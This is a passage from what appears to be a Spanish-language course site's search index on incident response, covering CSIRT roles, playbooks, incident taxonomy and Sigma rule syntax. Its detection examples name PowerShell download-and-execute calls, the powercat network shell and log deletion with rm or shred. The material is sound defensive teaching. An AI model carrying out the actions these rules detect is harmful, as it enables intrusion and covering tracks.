Aprendidas","text":"<p>Una vez resuelto el incidente, es fundamental reflexionar sobre lo ocurrido para mejorar las capacidades futuras.</p> <p>Esta fase a menudo se olvida\u2026 \u00a1pero es la que convierte el error en mejora continua!</p>"},{"location":"Gestion_incidentes/intro/#actividades-clave","title":"\ud83e\udde0 Actividades clave","text":""},{"location":"Gestion_incidentes/intro/#51-analisis-post-mortem-retrospectiva","title":"\ud83e\uddfe 5.1 An\u00e1lisis post-mortem (retrospectiva)","text":"<ul> <li>\u00bfQu\u00e9 sucedi\u00f3 exactamente?</li> <li>\u00bfC\u00f3mo se detect\u00f3 y respondi\u00f3?</li> <li>\u00bfQu\u00e9 funcion\u00f3 y qu\u00e9 no?</li> <li>\u00bfQu\u00e9 se podr\u00eda haber hecho mejor?</li> </ul>"},{"location":"Gestion_incidentes/intro/#52-mejora-de-controles-y-procesos","title":"\ud83d\udcc8 5.2 Mejora de controles y procesos","text":"<ul> <li>Actualizar pol\u00edticas y procedimientos.</li> <li>Ajustar configuraciones de seguridad (firewall, roles, alertas\u2026).</li> <li>Invertir en herramientas o formaci\u00f3n si se identificaron carencias.</li> </ul>"},{"location":"Gestion_incidentes/intro/#53-documentacion-formal","title":"\ud83e\udeaa 5.3 Documentaci\u00f3n formal","text":"<ul> <li>Redacci\u00f3n de informes internos y ejecutivos.</li> <li>Registro en sistemas de ticketing o bases de datos de incidentes.</li> <li>Informe a autoridades si es obligatorio (ej. AEPD, CCN-CERT).</li> </ul>"},{"location":"Gestion_incidentes/intro/#54-actualizacion-del-plan-irp-y-formacion","title":"\ud83d\udcda 5.4 Actualizaci\u00f3n del plan IRP y formaci\u00f3n","text":"<ul> <li>Modificaci\u00f3n del Plan de Respuesta a Incidentes.</li> <li>Inclusi\u00f3n del incidente como caso de estudio para futuras formaciones.</li> </ul>"},{"location":"Gestion_incidentes/intro/#resultado-esperado_1","title":"\ud83d\udccc Resultado esperado","text":"<p>Una organizaci\u00f3n resiliente:</p> <ul> <li>Aprende de cada incidente.</li> <li>Mejora continuamente su postura de ciberseguridad.</li> <li>Reduce el riesgo de que un incidente similar vuelva a ocurrir.</li> </ul>"},{"location":"Gestion_incidentes/intro/#6-roles-del-equipo-de-respuesta-a-incidentes-csirt","title":"\ud83d\udc68\u200d\ud83d\udcbb 6. Roles del Equipo de Respuesta a Incidentes (CSIRT)","text":"<p>Un equipo efectivo de respuesta a incidentes est\u00e1 compuesto por perfiles t\u00e9cnicos y estrat\u00e9gicos que colaboran de forma coordinada. Cada rol tiene funciones bien definidas para asegurar una respuesta eficiente y controlada.</p> Rol Funciones Principales SOC Analyst (Nivel 1/2/3) - Monitorizaci\u00f3n continua de alertas. - Triaje inicial de incidentes. - Contenci\u00f3n b\u00e1sica. Incident Responder - Investigaci\u00f3n en profundidad. - An\u00e1lisis forense b\u00e1sico. - Coordinaci\u00f3n t\u00e9cnica. Forensic Analyst - An\u00e1lisis de memoria, discos, logs. - Preservaci\u00f3n de evidencias. - Apoyo en procesos legales. Threat Hunter - Detecci\u00f3n proactiva de amenazas. - An\u00e1lisis de TTPs (MITRE ATT&amp;CK). - Mejora de alertado. CSIRT Manager - Liderazgo del equipo. - Comunicaci\u00f3n con stakeholders. - Priorizaci\u00f3n de incidentes. Malware Analyst - Reversing de malware. - An\u00e1lisis est\u00e1tico y din\u00e1mico. - Creaci\u00f3n de firmas (YARA, Snort). Threat Intelligence Analyst - Recolecci\u00f3n de inteligencia de amenazas. - Enlace con fuentes externas. - Informes y enriquecimiento de alertas. Communications Officer - Gesti\u00f3n de la comunicaci\u00f3n interna y externa. - Comunicaci\u00f3n de crisis. - Informes a reguladores o clientes. Legal/Compliance Advisor - Cumplimiento normativo (ENS, NIS2, RGPD). - Gesti\u00f3n legal de notificaciones y brechas. IT/Network Specialist - Aplicaci\u00f3n de contramedidas t\u00e9cnicas. - Hardening y reconfiguraci\u00f3n de red. - Coordinaci\u00f3n con sistemas."},{"location":"Gestion_incidentes/intro/#7-herramientas-clave-para-respuesta-a-incidentes","title":"\ud83d\udd27 7. Herramientas Clave para Respuesta a Incidentes","text":"Categor\u00eda Herramientas Comunes SIEM Splunk, Wazuh, IBM QRadar EDR/XDR CrowdStrike, SentinelOne, Microsoft Defender An\u00e1lisis Forense Autopsy, FTK Imager, Volatility Sandboxing Cuckoo Sandbox, Any.Run Threat Intel MISP, VirusTotal, Intel 471 SOAR TheHive + Cortex, Shuffle, Splunk SOAR, IBM Resilient"},{"location":"Gestion_incidentes/intro/#8-cultura-de-seguridad-y-deteccion-temprana","title":"\ud83e\udde0 8. Cultura de Seguridad y Detecci\u00f3n Temprana","text":"<p>Una respuesta efectiva comienza mucho antes de la detecci\u00f3n del incidente. La cultura organizativa es clave para prevenir y responder eficazmente.</p>"},{"location":"Gestion_incidentes/intro/#principios-fundamentales","title":"\ud83d\udccc Principios fundamentales:","text":"<ul> <li>Formaci\u00f3n continua de usuarios y t\u00e9cnicos.</li> <li>El usuario final puede ser el primer sensor de amenazas.</li> <li>Fomentar una cultura de reporte sin miedo ni represalias.</li> <li>Integrar la ciberseguridad en todos los niveles de la organizaci\u00f3n.</li> </ul>"},{"location":"Gestion_incidentes/intro/#9-que-es-un-playbook-de-respuesta-a-incidentes","title":"\ud83d\udcd8 9. \u00bfQu\u00e9 es un Playbook de Respuesta a Incidentes?","text":"<p>Un playbook es un procedimiento detallado, estructurado y reutilizable que define qu\u00e9 hacer paso a paso ante un tipo espec\u00edfico de incidente. Sirve como gu\u00eda para actuar con rapidez, coherencia y eficacia.</p>"},{"location":"Gestion_incidentes/intro/#por-que-usar-playbooks","title":"\ud83e\udded \u00bfPor qu\u00e9 usar playbooks?","text":"<ul> <li>Estandarizan la respuesta.</li> <li>Aumentan la agilidad del equipo.</li> <li>Facilitan el entrenamiento y la transferencia de conocimiento.</li> <li>Sirven de base para la automatizaci\u00f3n con SOAR.</li> </ul>"},{"location":"Gestion_incidentes/intro/#10-componentes-tipicos-de-un-playbook","title":"\ud83e\udde9 10. Componentes T\u00edpicos de un Playbook","text":"Componente Descripci\u00f3n Nombre del incidente Tipo de incidente tratado (phishing, ransomware, fuga de datos\u2026). Objetivo Qu\u00e9 se espera lograr con la respuesta. Indicadores (IoCs) Se\u00f1ales observables del incidente (hashes, IPs, dominios...). Fases de respuesta Qu\u00e9 hacer en cada etapa (detecci\u00f3n, contenci\u00f3n, erradicaci\u00f3n\u2026). Roles asignados Qui\u00e9n debe realizar cada tarea. Checklists operativas Acciones concretas: comandos, an\u00e1lisis, aislamiento, herramientas a utilizar. Notificaciones A qui\u00e9n avisar: CISO, DPO, RRHH, usuarios afectados, autoridades, etc. Referencias legales Obligaciones de notificaci\u00f3n seg\u00fan ENS, RGPD, NIS2, etc. Lecciones aprendidas Cambios a realizar tras el incidente o ensayo."},{"location":"Gestion_incidentes/intro/#12-ejemplo-breve-playbook-de-phishing","title":"\ud83d\udee0\ufe0f 12. Ejemplo Breve: Playbook de Phishing","text":"<pre><code>Nombre: Phishing por correo\nObjetivo: Evitar propagaci\u00f3n, identificar afectados, contener amenaza.\nFase 1: Confirmaci\u00f3n \u2192 Revisar encabezado, verificar URLs, analizar adjunto.\nFase 2: Contenci\u00f3n \u2192 Bloquear URL/IP en proxy/firewall, revocar accesos comprometidos.\nFase 3: Erradicaci\u00f3n \u2192 Eliminar email de bandejas, forzar cambio de contrase\u00f1as.\nFase 4: Notificaci\u00f3n \u2192 CISO, RRHH, usuarios afectados.\nFase 5: Mejora \u2192 Revisar filtros de correo, reforzar formaci\u00f3n.\n</code></pre>"},{"location":"Gestion_incidentes/intro/#13-13-relacion-con-soar-y-automatizacion","title":"13. \ud83d\udd01 13. Relaci\u00f3n con SOAR y Automatizaci\u00f3n","text":"<p>Una vez definidos, los playbooks pueden automatizarse mediante herramientas SOAR (Security Orchestration, Automation and Response).</p> <p>Estas plataformas integran sistemas, ejecutan tareas autom\u00e1ticamente y permiten a los analistas centrarse en la toma de decisiones cr\u00edticas.</p>"},{"location":"Gestion_incidentes/intro/#plataformas-soar-populares","title":"\ud83d\udee0\ufe0f Plataformas SOAR populares:","text":"<ul> <li> <p>TheHive + Cortex: Open-source, modular, muy usado en Europa.</p> </li> <li> <p>Splunk SOAR: Integrado con Splunk SIEM.</p> </li> <li> <p>IBM Resilient: Potente y enfocado en entornos regulados.</p> </li> </ul>"},{"location":"Gestion_incidentes/intro/#acciones-tipicas-automatizables","title":"\ud83d\udccc Acciones t\u00edpicas automatizables:","text":"<ul> <li> <p>Cuarentena de un equipo desde EDR.</p> </li> <li> <p>Env\u00edo autom\u00e1tico de alertas por correo o Slack.</p> </li> <li> <p>B\u00fasqueda de IoCs en m\u00faltiples fuentes.</p> </li> <li> <p>Registro del incidente en el sistema de ticketing.</p> </li> <li> <p>La automatizaci\u00f3n bien aplicada reduce el tiempo de respuesta y el desgaste del equipo.</p> </li> </ul>"},{"location":"Gestion_incidentes/intro/#14-taxonomia-de-incidentes","title":"\ud83d\udcbc 14. Taxonom\u00eda de incidentes","text":"<p>La taxonom\u00eda de incidentes es un sistema de clasificaci\u00f3n que permite categorizar los incidentes de seguridad en sistemas seg\u00fan su origen, impacto, t\u00e9cnicas utilizadas y vectores de ataque. Su objetivo es estandarizar el lenguaje en la respuesta a incidentes (IR) y facilitar el an\u00e1lisis forense, la contenci\u00f3n y la remediaci\u00f3n.</p> <p>A continuaci\u00f3n, se presenta una taxonom\u00eda t\u00e9cnica centrada en sistemas, basada en marcos como MITRE ATT&amp;CK, CWE (Common Weakness Enumeration) y NIST SP 800-61.</p>"},{"location":"Gestion_incidentes/intro/#1-por-que-usar-una-taxonomia","title":"1. \u00bfPor qu\u00e9 Usar una Taxonom\u00eda?","text":"<ul> <li>Estandarizaci\u00f3n: Lenguaje com\u00fan para describir incidentes</li> <li>Priorizaci\u00f3n: Determinar criticidad (ej: ransomware &gt; escaneo de puertos)</li> <li>Mejora continua: Generaci\u00f3n de m\u00e9tricas para an\u00e1lisis</li> </ul>"},{"location":"Gestion_incidentes/intro/#2-taxonomia-basada-en-sistemas","title":"2. Taxonom\u00eda Basada en Sistemas","text":""},{"location":"Gestion_incidentes/intro/#a-por-tipo-de-ataque","title":"A. Por Tipo de Ataque","text":"Categor\u00eda Ejemplos T\u00e9cnicos Indicadores Clave (IOCs) Malware Ransomware, rootkits, backdoors Hashes de archivos, conexiones C2 Explotaci\u00f3n de SW Vulnerabilidades (Log4j, ProxyShell) Logs de errores, ejecuci\u00f3n de payloads Credential Theft Pass-the-Hash, Kerberoasting Eventos 4625 (Windows)"},{"location":"Gestion_incidentes/intro/#b-por-impacto-en-sistemas","title":"B. Por Impacto en Sistemas","text":"Nivel Definici\u00f3n Ejemplo Cr\u00edtico Compromete toda la infraestructura Ransomware en servidores Alto Afecta m\u00faltiples sistemas Dominio AD comprometido"},{"location":"Gestion_incidentes/intro/#c-por-vector-de-inicializacion","title":"C. Por Vector de Inicializaci\u00f3n","text":"Vector Descripci\u00f3n Ejemplo en Sistemas Remoto Ataque desde red externa Explotaci\u00f3n de VPN Local Ejecuci\u00f3n desde dentro USB infectado"},{"location":"Gestion_incidentes/intro/#3-taxonomias-de-referencia","title":"3. Taxonom\u00edas de Referencia","text":""},{"location":"Gestion_incidentes/intro/#a-mitre-attck","title":"A. MITRE ATT&amp;CK","text":"<ul> <li>T\u00e1ctica: Persistence \u2192 T\u00e9cnica: Scheduled Task</li> <li>Ejemplo: <code>schtasks /create</code></li> </ul>"},{"location":"Gestion_incidentes/intro/#b-cwe-common-weakness-enumeration","title":"B. CWE (Common Weakness Enumeration)","text":"<ul> <li>CWE-89: SQL Injection \u2192 Ataque a bases de datos</li> </ul>"},{"location":"Gestion_incidentes/intro/#c-nist-sp-800-61","title":"C. NIST SP 800-61","text":"<ul> <li>Categor\u00edas: DoS, Unauthorized Access</li> </ul>"},{"location":"Gestion_incidentes/intro/#4-aplicacion-practica-en-ir","title":"4. Aplicaci\u00f3n Pr\u00e1ctica en IR","text":""},{"location":"Gestion_incidentes/intro/#paso-1-clasificar-el-incidente","title":"Paso 1: Clasificar el Incidente","text":"<ul> <li>Tipo: Malware (Ransomware)</li> <li>Impacto: Cr\u00edtico</li> <li>Vector: Remoto (RDP expuesto)</li> </ul>"},{"location":"Gestion_incidentes/intro/#paso-2-respuesta-tecnica","title":"Paso 2: Respuesta T\u00e9cnica","text":"<ul> <li> <p>Contenci\u00f3n: Bloquear IPs maliciosas</p> </li> <li> <p>Erradicaci\u00f3n: Eliminar tareas programadas (T1053.005 ATT&amp;CK)</p> </li> </ul>"},{"location":"Gestion_incidentes/intro/#paso-3-reporte-estructurado","title":"Paso 3: Reporte Estructurado","text":""},{"location":"Gestion_incidentes/intro/#reporte-de-incidente","title":"Reporte de Incidente","text":"<ul> <li>ID: INC-2023-001</li> <li>Taxonom\u00eda: Malware \u2192 Ransomware (Ryuk)</li> <li>T\u00e9cnicas MITRE: T1486 (Data Encrypted for Impact)</li> </ul>"},{"location":"Gestion_incidentes/intro/#5-herramientas-para-automatizacion","title":"5. Herramientas para Automatizaci\u00f3n","text":"<ul> <li> <p>MISP: Compartir IOCs</p> </li> <li> <p>Splunk ES: Correlaci\u00f3n con ATT&amp;CK</p> </li> <li> <p>TheHive: Gesti\u00f3n de casos</p> </li> </ul> <p>As\u00ed pues, a modo de recapitulaci\u00f3n, la taxonom\u00eda permite:</p> <ul> <li> <p>\u2714 Priorizar acciones t\u00e9cnicas</p> </li> <li> <p>\u2714 Comunicaci\u00f3n efectiva entre equipos</p> </li> <li> <p>\u2714 Integraci\u00f3n con marcos como ATT&amp;CK</p> </li> </ul>"},{"location":"Gestion_incidentes/intro/#conclusion_1","title":"\ud83d\udccc Conclusi\u00f3n","text":"<p>Responder a incidentes no es solo cuesti\u00f3n de tecnolog\u00eda, sino de personas, procesos y estrategia. Ense\u00f1ar a responder correctamente es tan importante como ense\u00f1ar a prevenir.</p> <p>\u201cLa preparaci\u00f3n es la mejor defensa, y la respuesta, la verdadera prueba de madurez en ciberseguridad.\u201d</p>"},{"location":"Gestion_incidentes/intro/#referencias","title":"Referencias","text":"<p>Don\u2019t Make These Incident Response Planning Mistakes</p>"},{"location":"Gestion_incidentes/sigma/","title":"Reglas Sigma y su relaci\u00f3n con Incident Response/Incident Management","text":"<p>Las reglas Sigma son un est\u00e1ndar abierto para la definici\u00f3n de reglas de detecci\u00f3n de amenazas en formato YAML/JSON, independiente de la plataforma de SIEM (Security Information and Event Management) o herramienta de an\u00e1lisis de logs. Estas reglas permiten describir patrones de comportamiento sospechosos o maliciosos en los registros de eventos, facilitando la detecci\u00f3n de posibles incidentes de seguridad.</p> <p>Seg\u00fan su propia definici\u00f3n:</p> <p>Cita</p> <p>Sigma es un formato de firma gen\u00e9rico y abierto que permite describir de forma sencilla eventos de logs relevantes. El formato de reglas es muy flexible, f\u00e1cil de escribir y aplicable a cualquier tipo de archivo de registro.</p> <p>El objetivo principal de este proyecto es proporcionar una forma estructurada en la que los investigadores o analistas puedan describir los m\u00e9todos de detecci\u00f3n que han desarrollado y hacerlos compartibles con otros.</p> <p>Sigma es para los archivos de registro lo que Snort es para el tr\u00e1fico de red y YARA para los archivos.</p>"},{"location":"Gestion_incidentes/sigma/#caracteristicas-principales-de-sigma","title":"Caracter\u00edsticas principales de Sigma","text":"<ol> <li>Independencia de plataforma: Las reglas pueden ser convertidas a formatos nativos de diferentes SIEMs (como Splunk, Elasticsearch, QRadar, etc.) mediante herramientas como Sigma Converter.</li> <li>Sintaxis estandarizada: Usan un esquema basado en YAML/JSON para definir condiciones de b\u00fasqueda en logs.</li> <li>Comunidad colaborativa: Existe un repositorio p\u00fablico (SigmaHQ) con reglas predefinidas para detectar TTPs (T\u00e1cticas, T\u00e9cnicas y Procedimientos) de frameworks como MITRE ATT&amp;CK.</li> </ol>"},{"location":"Gestion_incidentes/sigma/#casos-de-uso-de-sigma","title":"Casos de uso de Sigma","text":"<p>Sigma se desarroll\u00f3 con la mente puesta en los siguientes usos:</p> <ul> <li>Para que los m\u00e9todos de detecci\u00f3n y las firmas se puedan compartir junto con los IOC y las reglas de Yara.</li> <li>Para escribir b\u00fasquedas SIEM que eviten la dependencia de un proveedor.</li> <li>Para compartir firmas con comunidades de inteligencia de amenazas.</li> <li>Escribir reglas de detecci\u00f3n personalizadas para comportamientos maliciosos basados en condiciones espec\u00edficas.</li> </ul>"},{"location":"Gestion_incidentes/sigma/#relacion-con-incident-response-ir-y-incident-management-im","title":"Relaci\u00f3n con Incident Response (IR) y Incident Management (IM)","text":"<p>Las reglas Sigma mejoran la capacidad de respuesta ante incidentes de varias formas:</p>"},{"location":"Gestion_incidentes/sigma/#1-deteccion-temprana-de-amenazas","title":"1. Detecci\u00f3n temprana de amenazas","text":"<ul> <li>Permiten identificar indicadores de compromiso (IOCs) y comportamientos an\u00f3malos (IOAs) en logs.</li> <li>Ejemplo: Detecci\u00f3n de ejecuci\u00f3n de PowerShell malicioso, movimiento lateral, exfiltraci\u00f3n de datos.</li> </ul>"},{"location":"Gestion_incidentes/sigma/#2-automatizacion-de-alertas","title":"2. Automatizaci\u00f3n de alertas","text":"<ul> <li>Al integrarse con un SIEM, generan alertas que pueden disparar flujos de IR (como notificaciones a equipos SOC o automatizaci\u00f3n con SOAR).</li> </ul>"},{"location":"Gestion_incidentes/sigma/#3-consistencia-en-la-respuesta","title":"3. Consistencia en la respuesta","text":"<ul> <li>Al estandarizar las reglas, se reduce la dependencia de soluciones propietarias y se facilita la colaboraci\u00f3n entre equipos.</li> </ul>"},{"location":"Gestion_incidentes/sigma/#4-integracion-con-mitre-attck","title":"4. Integraci\u00f3n con MITRE ATT&amp;CK","text":"<ul> <li>Muchas reglas Sigma est\u00e1n mapeadas a t\u00e9cnicas de ATT&amp;CK, lo que ayuda en la clasificaci\u00f3n y priorizaci\u00f3n de incidentes.</li> </ul>"},{"location":"Gestion_incidentes/sigma/#5-mejora-en-la-investigacion-forense","title":"5. Mejora en la investigaci\u00f3n forense","text":"<ul> <li>Proporcionan b\u00fasquedas predefinidas para analizar logs durante la contenci\u00f3n y erradicaci\u00f3n de un incidente.</li> </ul>"},{"location":"Gestion_incidentes/sigma/#ejemplo-de-una-regla-sigma-yaml","title":"Ejemplo de una regla Sigma (YAML)","text":"<pre><code>title: Suspicious PowerShell Execution\ndescription: Detects suspicious PowerShell command lines often used in attacks\nstatus: experimental\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Invoke-Expression'\n            - 'IEX'\n            - 'DownloadString'\n    condition: selection\nfalsepositives:\n    - Legitimate PowerShell scripts using these commands\nlevel: high\ntags:\n    - attack.execution\n    - attack.t1059.001  # MITRE ATT&amp;CK: Command-Line Interface - PowerShell\n</code></pre> <p>Beneficios para Incident Management</p> <ul> <li> <p>Estandarizaci\u00f3n: Facilita la documentaci\u00f3n y el sharing de reglas entre organizaciones.</p> </li> <li> <p>Escalabilidad: Permite adaptar detecciones a m\u00faltiples entornos sin reescribir reglas.</p> </li> <li> <p>Respuesta m\u00e1s r\u00e1pida: Reduce el tiempo de detecci\u00f3n (MTTD) y respuesta (MTTR).</p> </li> </ul> <p>En resumen, las reglas Sigma son una herramienta clave para mejorar la detecci\u00f3n proactiva y la eficiencia en la gesti\u00f3n de incidentes, aline\u00e1ndose con mejores pr\u00e1cticas de ciberseguridad.</p>"},{"location":"Gestion_incidentes/sigma/#sintaxis-de-las-reglas-sigma","title":"Sintaxis de las reglas Sigma","text":"<p>Como se mencionaba antes, las reglas Sigma est\u00e1n escritas en YAML Ain't Markup Language (YAML), un lenguaje de serializaci\u00f3n de datos legible por humanos y \u00fatil para la gesti\u00f3n de datos. A menudo se utiliza como formato para archivos de configuraci\u00f3n, pero sus capacidades de serializaci\u00f3n de objetos lo convierten en un sustituto de lenguajes como JSON.</p> <p>Los factores comunes a tener en cuenta sobre los archivos YAML son:</p> <ul> <li>YAML distingue entre may\u00fasculas y min\u00fasculas</li> <li>Los archivos deben tener la extensi\u00f3n .yml</li> <li>Se utilizan espacios para la sangr\u00eda y no tabuladores</li> <li>Los comentarios se especifician con el car\u00e1cter #</li> <li>Los pares clave-valor se indican con dos puntos :</li> <li>Los elementos de arrays se indican con el car\u00e1cter -</li> </ul> <p>Plantilla de sintaxis de Sigma</p> <p>Siguiendo con la forma de uso de YAML para reglas Sigma, la sintaxis define varios campos obligatorios y opcionales que van en cada regla. Esto se puede resaltar utilizando la imagen:</p> <p></p> <p>Utilicemos un ejemplo de regla de Suscripci\u00f3n a Eventos WMI para definir los diferentes elementos de la sintaxis. </p> <pre><code>title: #Title of your rule\nid: #Universally Unique Identifier (UUID) Generate one from https://www.uuidgenerator.net\nstatus: #stage of your rule testing \ndescription: #Details about the detection intensions of the rule.\nauthor: #Who wrote the rule.\ndate: #When was the rule written.\nmodified: #When was it updated\nlogsource:\n  category: #Classification of the log data for detection\n  product: #Source of the log data\ndetection:\n  selection:\n    FieldName1: Value #Search identifiers for the detection\n    FieldName2: Value\n  condition: selection #Action to be taken.\nfields: #List of associated fields that are important for the detection\n\nfalsepositives: #Any possible false positives that could trigger the rule.\n\nlevel: medium #Severity level of the detection rule.\ntags: #Associated TTPs from MITRE ATT&amp;CK\n  - attack.credential_access #MITRE Tactic\n  - attack.t1110 #MITRE Technique\n</code></pre> <ol> <li> <p>Title: Nombra la regla en funci\u00f3n de lo que se supone que debe detectar. Debe ser corto y claro.</p> </li> <li> <p>ID: Identificador \u00fanico global utilizado principalmente por los desarrolladores de Sigma para mantener el orden de identificaci\u00f3n de las reglas enviadas al repositorio p\u00fablico, se encuentra en formato UUID. </p> <p>Tambi\u00e9n puede a\u00f1adir referencias a ID de reglas relacionadas utilizando el atributo related, lo que facilita la formaci\u00f3n de relaciones entre detecciones. Estas relaciones ser\u00edan de los siguientes tipos</p> <ul> <li>Derived: Describir\u00e1 que la regla ha surgido de otra regla, que puede estar a\u00fan activa.</li> <li>Obsolete: Indicar\u00e1 que la regla listada ya no se utiliza.</li> <li>Merged: Indica que la regla combina reglas vinculadas.</li> <li>Renamed: Indica que la regla se identificaba anteriormente con un ID diferente, pero que ahora se ha modificado debido a cambios en los esquemas de nomenclatura o para evitar colisiones. </li> <li>Similar: Este atributo se\u00f1ala reglas correspondientes, por ejemplo, indica el mismo contenido de detecci\u00f3n aplicado a diferentes fuentes de logs.</li> </ul> </li> <li> <p>Status: Describe la fase en la que se encuentra la madurez de la regla mientras est\u00e1 en uso. Hay cinco estados declarados que se pueden utilizar:</p> <ul> <li>Stable: La regla puede utilizarse en entornos de producci\u00f3n y dashboards.</li> <li>Test: Se est\u00e1n haciendo pruebas a la regla y podr\u00eda requerir un ajuste fino.</li> <li>Experimental: La regla es muy gen\u00e9rica y se est\u00e1 probando. Podr\u00eda dar lugar a resultados falsos, ser ruidosa e/o identificar eventos interesantes.</li> <li>Deprecated: La regla ha sido sustituida y ya no producir\u00eda resultados precisos. El campo \u00abrelated\u00bb se utiliza para crear asociaciones entre la regla actual y una que ha sido obsoleta.</li> <li>Unsupported: La regla no es utilizable en su estado actual (registro de correlaci\u00f3n \u00fanico, campos ad-hoc).</li> </ul> </li> <li> <p>Description: Proporciona m\u00e1s contexto sobre la regla y su prop\u00f3sito previsto. Se ha de ser lo m\u00e1s verborreico posible sobre la actividad maliciosa que se pretende detectar.</p> WMI_Event_Suscription.yml<pre><code>title: WMI Event Subscription\nid: 0f06a3a5-6a09-413f-8743-e6cf35561297\nstatus: test\ndescription: Detects creation of WMI event subscription persistence method.\n</code></pre> </li> <li> <p>Logsource: Describe los datos de logs que se utilizar\u00e1n para la detecci\u00f3n. Consta de otros atributos opcionales:</p> <ul> <li>Product: Selecciona todas los logs de un producto concreto. Algunos ejemplos son Windows, Apache.</li> <li>Category: El campo category describe el tipo de datos o eventos, sin importar el sistema operativo o la tecnolog\u00eda espec\u00edfica. Sirve para abstraer la fuente de log a un nivel m\u00e1s general, permitiendo portabilidad entre diferentes plataformas. (p.ej.: <code>process_creation</code>o <code>file_access</code>)</li> <li>Service: Selecciona s\u00f3lo un subconjunto de los logs del producto seleccionado (Sysmon, Security, SSH, etc.)</li> <li> <p>Definition: En lugar de definir directamente product, service o category en cada regla, puedes referenciar una definici\u00f3n externa preestablecida, como si fuese una plantilla. Esto es especialmente \u00fatil en organizaciones grandes o en repositorios compartidos.</p> <p>Ejemplo de uso:</p> <p>Sup\u00f3n que tienes una definici\u00f3n com\u00fan de logs de Sysmon que quieres usar en muchas reglas:</p> <p>\ud83d\udd38 Archivo de definici\u00f3n (<code>logsource-definitions.yml</code> o similar):</p> <pre><code>sysmon_process_creation:\n  product: windows\n  service: sysmon\n  category: process_creation\n</code></pre> <p>\ud83d\udd38 Regla Sigma que usa esa definici\u00f3n:</p> <pre><code>title: Suspicious Command Line\nlogsource:\n  definition: sysmon_process_creation\ndetection:\n</code></pre> WMI_Event_Suscription.yml<pre><code>logsource:\nproduct: windows    \ncategory: wmi_event \n</code></pre> </li> </ul> </li> <li> <p>Detection: Un campo obligatorio en la regla de detecci\u00f3n describe los par\u00e1metros de la actividad maliciosa para la que necesitamos una alerta. Los par\u00e1metros se dividen en dos partes principales: los identificadores de b\u00fasqueda - los campos y valores que la detecci\u00f3n debe buscar - y la expresi\u00f3n de la condici\u00f3n - que establece la acci\u00f3n a tomar en la detecci\u00f3n, como la selecci\u00f3n o el filtrado. Lo veremos m\u00e1s adelante.</p> <p>Esta regla tiene un modificador de detecci\u00f3n que busca registros con uno de los Windows Event IDs 19, 20 o 21. La condici\u00f3n informa al motor de detecci\u00f3n para que busque y seleccione los registros identificados.</p> WMI_Event_Suscription.yml<pre><code>    detection:\n      selection:\n          EventID:  # This shows the search identifier value\n          - 19    # This shows the search's list value\n          - 20\n          - 21\n      condition: selection\n</code></pre> </li> <li> <p>FalsePositives: Una lista de falsos positivos conocidos que pueden ocurrir, basados en los datos de los logs</p> </li> <li>Level: Severidad de la actividad detectada: Informational --&gt; Low --&gt; Medium --&gt; High --&gt; Critical</li> <li> <p>Tags: A\u00f1aden informaci\u00f3n que puede usarse para categorizar la regla. Pueden incluir valores de CVE y TTP del framework MITRE ATT&amp;CK. Los desarrolladores de Sigma tiene una lista de tags predefinidos.</p> WMI_Event_Suscription.yml<pre><code>falsepositives:\n    - Exclude legitimate (vetted) use of WMI event subscription in your network\n\nlevel: medium\n\ntags:\n- attack.persistence # Points to the MITRE tactic.\n- attack.t1546.003   # Points to the MITRE technique.    \n</code></pre> </li> </ol>"},{"location":"Gestion_incidentes/sigma/#identificadores-de-busqueda-y-expresiones-condicionales","title":"Identificadores de b\u00fasqueda y expresiones condicionales","text":"<p>Como ya se ha mencionado, la secci\u00f3n de detection de la regla describe lo que se pretende buscar dentro de los datos de registro y c\u00f3mo se van a evaluar la selecci\u00f3n y los filtros. La definici\u00f3n de los identificadores de b\u00fasqueda puede comprender dos estructuras de datos -listas y mapas- que dictan el orden en que se procesar\u00e1 la detecci\u00f3n.</p> <p>Cuando los identificadores se proporcionan mediante listas, se presentar\u00e1n mediante cadenas enlazadas con una operaci\u00f3n l\u00f3gica \u00abOR\u00bb. Principalmente, se enumerar\u00e1n utilizando guiones (-). </p> <p>Por ejemplo, a continuaci\u00f3n, podemos ver un extracto de la regla Netcat Powershell Version donde la detecci\u00f3n se escribe para que coincida en el campo <code>HostApplication</code> que contiene \u201cpowercat\u201d o \u201cpowercat.ps1\u201d como valor.</p> Posh_PC_Powercat.yml<pre><code>detection:\n  selection:\n    HostApplication|contains:\n         - 'powercat'\n         - 'powercat.ps1'\n  condition: selection     \n</code></pre> <p>Por otro lado, los mapas comprenden pares clave/valor en los que la clave coincide con un campo de los datos del registro, mientras que el valor presentado es una cadena o un valor num\u00e9rico que debe buscarse en el registro. Los mapas siguen una operaci\u00f3n l\u00f3gica \u00abAND\u00bb.</p> <p>Como ejemplo, podemos ver la regla de registro Clear Linux donde el t\u00e9rmino de <code>selection</code> forma el mapa, y la regla intenta buscar en <code>Image|endswith</code> cualquiera de los valores listados, y <code>CommandLine</code> contiene cualquiera de los valores listados. Este ejemplo muestra c\u00f3mo los mapas y las listas pueden usarse juntos cuando se desarrollan detecciones. Debe tenerse en cuenta que <code>endswith</code> y <code>contains</code> son modificadores de valor, y que se utilizan dos listas para los valores de b\u00fasqueda, donde uno de cada grupo tiene que coincidir para que la regla inicie una alerta.</p> Process_Creation_Lnx_Clear_Logs.yml<pre><code>detection:\n  selection:\n    Image|endswith:\n         - '/rm' # covers /rmdir as well\n         - '/shred'\n    CommandLine|contains:\n         - '/var/log'\n         - '/var/spool/mail'\n  condition: selection\n</code></pre> <p>Ya que hemos mencionado el modificador de valor, vale la pena se\u00f1alar que se a\u00f1aden despu\u00e9s del nombre del campo con un car\u00e1cter de tuber\u00eda <code>|</code>, y hay dos tipos de modificadores de valor:</p> <ul> <li> <p>Modificadores de transformaci\u00f3n: Se aplican directamente al nombre del campo e indican c\u00f3mo debe compararse ese campo con el valor. Incluyen:</p> <ul> <li>contains: El valor coincidir\u00eda en cualquier parte del campo.</li> <li>all: Cambia la operaci\u00f3n OR de las listas por una operaci\u00f3n AND. Esto significa que las condiciones de b\u00fasqueda tienen que coincidir con todos los valores de la lista.</li> <li>base64: Busca valores codificados con Base64.</li> <li>endswith: Con este modificador, se espera que el valor est\u00e9 al final del campo. Por ejemplo, esto es representativo de <code>*\\cmd.exe</code></li> <li>startswith: Este modificador coincidir\u00e1 con el valor al principio del campo. Por ejemplo, <code>power*</code>.</li> </ul> </li> <li> <p>Modificadores de tipo: Transforman el valor o el campo antes de la comparaci\u00f3n. Tambi\u00e9n se a\u00f1aden con |, y pueden combinarse con los de tipo (p.ej.: lower, upper, 